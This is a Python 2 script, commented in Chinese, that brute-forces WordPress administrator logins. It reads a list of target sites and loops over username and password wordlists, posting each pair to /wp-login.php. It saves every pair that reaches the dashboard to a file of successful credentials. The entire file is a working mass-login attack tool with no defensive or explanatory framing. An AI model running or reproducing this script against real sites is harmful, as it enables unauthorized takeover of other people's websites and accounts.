#!/usr/bin/python
# -*- coding:utf-8 -*-
import requests
import cookielib
import urllib2
import urllib
bc = open('success.txt','w')
ht = "/wp-login.php"
headers = {"Content-type":"application/x-www-form-urlencoded","User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0",
		   "Connection": "keep-alive"}
urls = open('url.txt','r')
for x in urls:
	x = x.strip()
	print x,"=============="
	try:
		qq = requests.get(str(x) + str(ht),timeout=15)
		if qq.status_code == 200:
			print qq.url
			user = open('user.txt','r')
			for u in user:
				u = u.strip()
				print "username: ",u
				pw = open('pass.txt','r')
				for p in pw:
					p = p.strip()
					print "password: ",p
					#设置一个cookie处理器，它负责从服务器下载cookie到本地，并且在发送请求时带上本地的cookie
					cj = cookielib.LWPCookieJar()
					cookie_support = urllib2.HTTPCookieProcessor(cj)
					opener = urllib2.build_opener(cookie_support, urllib2.HTTPHandler)
					urllib2.install_opener(opener)
					postData = {'log':u,'pwd':p}
					#需要给Post数据编码
					postData = urllib.urlencode(postData)
					#通过urllib2提供的request方法来向指定Url发送我们构造的数据，并完成登录过程
					request = urllib2.Request(qq.url, postData, headers)
					response = urllib2.urlopen(request)
					text = response.read()
					#print text
					if text.find('Dashboard')!=-1 or text.find('仪表盘').decode('gb2312').encode('utf-8')!=-1:
						print 'success',qq.url , 'username is: ' + u , 'password is : ' + p
						print>>bc,'success',qq.url , 'username is: ' + u , 'password is : ' + p
						break
	except:
		pass
	
